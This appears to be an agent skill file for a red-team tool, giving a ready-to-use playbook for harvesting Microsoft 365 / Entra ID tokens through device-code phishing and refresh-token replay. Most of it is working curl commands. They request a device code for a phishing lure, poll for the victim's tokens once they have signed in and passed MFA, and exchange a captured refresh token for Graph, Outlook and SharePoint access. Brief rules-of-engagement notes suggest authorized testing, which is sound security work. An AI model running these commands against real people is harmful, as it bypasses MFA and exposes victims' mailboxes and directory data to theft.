---
name: o365-credential-harvest
description: >
  Harvest and replay O365 / Entra ID access via the OAuth device-code flow and
  captured tokens (TokenTactics-style), skipping the password + MFA prompts.
metadata:
  subdomain: phishing
  when_to_use: "o365 phishing, entra id, oauth device code, token replay, tokentactics, microsoft 365 credential harvest, illicit consent"
  mitre_attack:
    - T1566.002
    - T1528
    - T1550.001
    - T1621
  tags:
    - phishing
    - o365
    - oauth
    - token-replay
---

# O365 / Entra Credential & Token Harvest

Two Microsoft-identity initial-access paths that avoid a fake password
page: the **device-code** flow and **token replay**. Both are favored
because the victim authenticates on the genuine Microsoft endpoint.

## Device-code flow

The attacker requests a device code; the victim is social-engineered
to enter it at the real `microsoft.com/devicelogin`. After they
complete sign-in (MFA included), the attacker polls and receives
access + refresh tokens.

```bash
TENANT=common
CLIENT=d3590ed6-52b3-4102-aeff-aad2292ab01c   # Office client id (example)
# 1. request a device code
curl -s https://login.microsoftonline.com/$TENANT/oauth2/v2.0/devicecode \
  -d "client_id=$CLIENT&scope=https://graph.microsoft.com/.default offline_access" | tee dc.json
# -> user_code + verification_uri go into the lure ("enter this code at ...")
# 2. poll for the token after the victim signs in
DC=$(jq -r .device_code dc.json)
curl -s https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=$CLIENT&device_code=$DC"
```

## Token replay (TokenTactics pattern)

A refresh token captured here (or via `evilginx2-proxy`) is exchanged
for access tokens against Graph, Outlook, SharePoint, Teams — each a
distinct resource scope — without re-auth.

```bash
RT=<captured-refresh-token>
curl -s https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -d "grant_type=refresh_token&client_id=$CLIENT&refresh_token=$RT&scope=https://graph.microsoft.com/.default"
# use the returned access_token: Authorization: Bearer <token> against graph.microsoft.com
```

## Validate

A token is interesting; a Graph call returning the victim's mailbox /
directory data is the finding:
`curl -s -H "Authorization: Bearer $AT" https://graph.microsoft.com/v1.0/me`.

## Evidence

Tokens → `Credential` nodes (type `oauth-token`, with scope + expiry)
linked to the `User` node. Store ONLY under `evidence/phisher/` + the
knowledge graph.

## RoE / OPSEC

- Device-code lures still require the `lure-deconfliction` handshake.
- Refresh tokens are long-lived — record the expiry and treat them as
  the most sensitive artifact in the engagement.
- NEVER read more mailbox/Graph data than the objective requires;
  abide by `plan/roe.json:data_handling`.
